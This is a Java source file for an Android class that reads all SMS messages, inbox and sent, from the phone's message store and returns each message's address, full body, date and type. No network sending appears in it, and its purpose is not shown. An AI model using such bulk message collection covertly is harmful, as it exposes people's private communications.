package com.my.luck.features;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;
import android.util.Log;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;

public class SmsModule {
    private static final String TAG = "SmsModule";
    private Context context;

    public SmsModule(Context context) {
        this.context = context;
    }

    public List<HashMap<String, String>> getAllSms() {
        List<HashMap<String, String>> smsList = new ArrayList<>();
        try {
            ContentResolver cr = context.getContentResolver();
            Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC");
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    HashMap<String, String> sms = new HashMap<>();
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                    sms.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                            .format(new Date(cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)))));
                    sms.put("type", getSmsType(cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))));
                    sms.put("id", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms._ID)));
                    smsList.add(sms);
                } while (cursor.moveToNext());
                cursor.close();
            }
            Log.d(TAG, "Found " + smsList.size() + " SMS messages");
        } catch (Exception e) {
            Log.e(TAG, "Error getting SMS", e);
        }
        return smsList;
    }

    public List<HashMap<String, String>> getInboxSms() {
        List<HashMap<String, String>> smsList = new ArrayList<>();
        try {
            ContentResolver cr = context.getContentResolver();
            Cursor cursor = cr.query(Telephony.Sms.Inbox.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC");
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    HashMap<String, String> sms = new HashMap<>();
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                    sms.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                            .format(new Date(cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)))));
                    sms.put("id", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms._ID)));
                    smsList.add(sms);
                } while (cursor.moveToNext());
                cursor.close();
            }
            Log.d(TAG, "Found " + smsList.size() + " inbox SMS");
        } catch (Exception e) {
            Log.e(TAG, "Error getting inbox SMS", e);
        }
        return smsList;
    }

    public List<HashMap<String, String>> getSentSms() {
        List<HashMap<String, String>> smsList = new ArrayList<>();
        try {
            ContentResolver cr = context.getContentResolver();
            Cursor cursor = cr.query(Telephony.Sms.Sent.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC");
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    HashMap<String, String> sms = new HashMap<>();
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                    sms.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                            .format(new Date(cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)))));
                    sms.put("id", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms._ID)));
                    smsList.add(sms);
                } while (cursor.moveToNext());
                cursor.close();
            }
            Log.d(TAG, "Found " + smsList.size() + " sent SMS");
        } catch (Exception e) {
            Log.e(TAG, "Error getting sent SMS", e);
        }
        return smsList;
    }

    private String getSmsType(int type) {
        switch (type) {
            case Telephony.Sms.MESSAGE_TYPE_INBOX: return "INBOX";
            case Telephony.Sms.MESSAGE_TYPE_SENT: return "SENT";
            case Telephony.Sms.MESSAGE_TYPE_DRAFT: return "DRAFT";
            case Telephony.Sms.MESSAGE_TYPE_OUTBOX: return "OUTBOX";
            case Telephony.Sms.MESSAGE_TYPE_FAILED: return "FAILED";
            case Telephony.Sms.MESSAGE_TYPE_QUEUED: return "QUEUED";
            default: return "UNKNOWN";
        }
    }
}